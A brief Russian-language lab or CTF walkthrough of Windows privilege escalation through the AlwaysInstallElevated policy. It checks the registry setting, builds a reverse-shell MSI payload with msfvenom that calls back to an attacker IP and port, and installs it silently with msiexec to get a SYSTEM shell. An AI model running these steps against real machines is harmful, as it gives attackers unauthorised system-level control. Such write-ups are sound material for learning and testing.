Подключаемся к машине и проверяем включена ли политика AlwaysInstallElevated
```shell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Политика имеет значение (0x1) - включена

Создаем полезную нагрузку msi и запускаем слушателя ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=100.100.2.252 LPORT=4444 -f msi -o test.msi```
 Передаем на машину и запускаем установку msiexec.exe /quiet /qn /i test.msi
 Получаем обратный шелл от системы и забираем флаг
